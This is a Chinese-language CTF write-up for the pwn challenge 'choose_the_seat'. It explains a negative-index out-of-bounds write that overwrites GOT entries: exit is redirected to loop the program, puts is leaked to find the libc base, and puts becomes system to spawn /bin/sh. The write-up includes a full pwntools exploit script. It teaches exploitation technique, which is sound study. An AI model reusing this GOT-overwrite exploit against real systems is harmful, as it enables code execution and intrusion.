# choose_the_seat

## 题目简述

程序让用户选择编号为 `0` 到 `9` 的座位，但只检查 `index > 9`，没有拒绝负数。每个座位占 16 字节，数组 `seats` 位于 `.bss`；输入负下标后，`read` 可以反向越界写入位于数组之前的 GOT。程序启用 NX、未启用 PIE，且为 Partial RELRO，因此 GOT 可写。

## 解题过程

### 计算负下标对应的 GOT 项

写入地址为：

$$
address = 0x4040A0 + 16 \times index
$$

关键位置为：

| 下标 | 起始地址 | 可覆盖内容 |
| ---: | ---: | --- |
| `-6` | `0x404040` | `exit@GOT` |
| `-8` | `0x404020` | `setbuf@GOT` |
| `-9` | `0x404010` | 8 字节空位以及紧随其后的 `puts@GOT` |

函数末尾会调用 `exit`，因此第一步用下标 `-6` 把 `exit@GOT` 改成易受攻击函数 `vuln`，让程序结束一轮后重新进入输入流程。

### 泄漏 libc

使用下标 `-9` 向 `0x404010` 写入恰好 8 个非零字符。后续程序以字符串方式输出该位置时，因为没有遇到 `\0`，会继续打印相邻的 `puts@GOT` 内容。跳过前 8 个字符，接收后面的 6 字节指针并减去 `puts` 的 libc 偏移，即可得到 libc 基址。

### 覆盖 `puts@GOT`

仍选择 `-9`，一次写入 16 字节：前 8 字节放 `/bin/sh\0`，后 8 字节把相邻的 `puts@GOT` 改为 `system`。程序随后本应调用 `puts` 输出该座位内容，实际变成：

```c
system("/bin/sh");
```

完整利用如下，符号偏移取自题目配套的 libc：

```python
from pwn import *

context.binary = elf = ELF("./vuln", checksec=False)
libc = ELF("./libc-2.31.so", checksec=False)
io = remote("目标地址", 端口)

# exit@GOT -> vuln，使每一轮结束后重新进入漏洞函数。
io.sendlineafter(b"one.", b"-6")
io.sendafter(b"name", p64(elf.symbols["vuln"]))

# 从 0x404010 连续输出，越过 8 个填充字节泄漏 puts@GOT。
io.sendlineafter(b"one.", b"-9")
io.sendafter(b"name", b"A" * 8)
io.recvuntil(b"A" * 8)
puts_addr = u64(io.recvn(6).ljust(8, b"\x00"))
libc.address = puts_addr - libc.symbols["puts"]
log.success(f"libc base: {libc.address:#x}")

# 0x404010 <- "/bin/sh\0"，0x404018（puts@GOT）<- system。
io.sendlineafter(b"one.", b"-9")
io.sendafter(b"name", b"/bin/sh\x00" + p64(libc.symbols["system"]))

io.interactive()
```

## 方法总结

- 核心技巧：利用只检查上界的数组下标，将 `.bss` 中的定长写入原语反向移动到可写 GOT。
- 利用链：`exit@GOT -> vuln` 保持循环，字符串越界读取泄漏 `puts`，最后 `puts@GOT -> system` 并布置 `/bin/sh`。
- 复用要点：不要只把负下标看作“数组前几个元素”；应按元素步长计算绝对地址，并结合 RELRO、PIE、相邻符号布局寻找可重复写和信息泄漏。
